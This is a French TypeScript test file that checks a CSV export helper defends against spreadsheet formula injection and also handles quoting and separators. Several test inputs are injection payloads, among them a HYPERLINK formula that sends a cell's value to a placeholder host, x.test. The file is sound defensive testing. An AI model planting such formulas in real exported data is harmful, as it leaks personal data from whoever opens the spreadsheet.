import { describe, expect, it } from "vitest";
import { celluleCsv, ligneCsv } from "@/lib/csv";

/**
 * Les colonnes exportées viennent de formulaires publics. Une cellule qui
 * commence par « = » est une formule pour Excel : saisie comme prénom, elle
 * s'exécute sur le poste de la personne qui ouvre le fichier, et peut envoyer
 * la liste ailleurs. C'est le genre de faille qu'on ne voit jamais venir,
 * parce qu'elle n'est pas dans le site mais dans le tableur.
 */

describe("celluleCsv — les formules", () => {
  // Une cellule dangereuse qui contient aussi une virgule ou un guillemet
  // sort entre guillemets : l'apostrophe est alors en seconde position.
  const inerte = (v: string) => celluleCsv(v).replace(/^"/, "").startsWith("'");

  it("rend inerte une cellule qui commence par un opérateur", () => {
    for (const debut of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(inerte(`${debut}WEBSERVICE("http://x")`), `début « ${debut} »`).toBe(true);
    }
  });

  it("neutralise le cas réel : une formule saisie comme prénom", () => {
    const attaque = '=HYPERLINK("https://x.test/?f="&C2,"Cliquez")';
    // La virgule impose les guillemets du format, l'apostrophe suit.
    expect(celluleCsv(attaque).startsWith("\"'=HYPERLINK")).toBe(true);
    expect(inerte(attaque)).toBe(true);
  });

  it("ne touche pas à un texte ordinaire", () => {
    expect(celluleCsv("Marie")).toBe("Marie");
    expect(celluleCsv("Jean-Pierre")).toBe("Jean-Pierre");
    expect(celluleCsv("a+b")).toBe("a+b");
    expect(celluleCsv("prix = 500")).toBe("prix = 500");
  });
});

describe("celluleCsv — le format", () => {
  it("entoure de guillemets ce qui casserait la colonne", () => {
    expect(celluleCsv("Centre HUT, Sarthe")).toBe('"Centre HUT, Sarthe"');
    expect(celluleCsv("a;b")).toBe('"a;b"');
    expect(celluleCsv("deux\nlignes")).toBe('"deux\nlignes"');
  });

  it("double les guillemets intérieurs", () => {
    expect(celluleCsv('dit "oui"')).toBe('"dit ""oui"""');
  });

  it("écrit une case vide pour rien", () => {
    expect(celluleCsv(null)).toBe("");
    expect(celluleCsv(undefined)).toBe("");
    expect(celluleCsv("")).toBe("");
  });

  it("accepte un nombre comme un texte", () => {
    expect(celluleCsv(42)).toBe("42");
    expect(celluleCsv(0)).toBe("0");
  });
});

describe("ligneCsv", () => {
  it("sépare par des points-virgules, comme l'attend Excel en français", () => {
    expect(ligneCsv(["Marie", "marie@example.com", 2])).toBe("Marie;marie@example.com;2");
  });

  it("protège chaque cellule indépendamment", () => {
    expect(ligneCsv(["=1+1", "ok", "a;b"])).toBe("'=1+1;ok;\"a;b\"");
  });
});
